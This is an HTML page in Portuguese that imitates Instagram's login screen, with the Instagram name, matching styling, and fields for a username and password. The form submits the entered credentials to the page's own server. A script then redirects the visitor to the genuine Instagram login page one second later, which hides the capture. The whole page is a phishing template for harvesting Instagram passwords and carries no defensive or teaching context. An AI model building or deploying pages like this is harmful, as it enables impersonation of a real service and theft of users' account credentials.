<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Instagram Style</title>
  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: #fff;
      padding: 40px;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      width: 320px;
      text-align: center;
    }
    h2 {
      font-family: 'Billabong', cursive;
      font-size: 42px;
      margin-bottom: 30px;
      color: #262626;
    }
    .form-group {
      margin-bottom: 15px;
      text-align: left;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
      font-size: 14px;
      color: #262626;
    }
    input[type="text"]:focus, input[type="password"]:focus {
      border-color: #0095f6;
      outline: none;
      box-shadow: 0 0 5px rgba(0,149,246,0.3);
    }
    input[type="submit"] {
      width: 100%;
      background-color: #0095f6;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.3s ease;
    }
    input[type="submit"]:hover {
      background-color: #0077cc;
    }
    .extra-links {
      margin-top: 20px;
      font-size: 12px;
    }
    .extra-links a {
      color: #0095f6;
      text-decoration: none;
    }
    .extra-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Instagram</h2>
    <form method="POST" action="">
      <div class="form-group">
        <input type="text" id="username" name="username" placeholder="Telefone, nome de usuário ou email" required>
      </div>
      <div class="form-group">
        <input type="password" id="password" name="password" placeholder="Senha" required>
      </div>
      <input type="submit" value="Entrar">
    </form>
    <div class="extra-links">
      <a href="#">Esqueceu a senha?</a>
    </div>
  </div>

  <!-- Script para redirecionar após envio -->
  <script>
    document.querySelector("form").addEventListener("submit", function() {
      setTimeout(function() {
        window.location.href = "https://www.instagram.com/accounts/login/";
      }, 1000); // espera 1 segundo antes de redirecionar
    });
  </script>
</body>
</html>
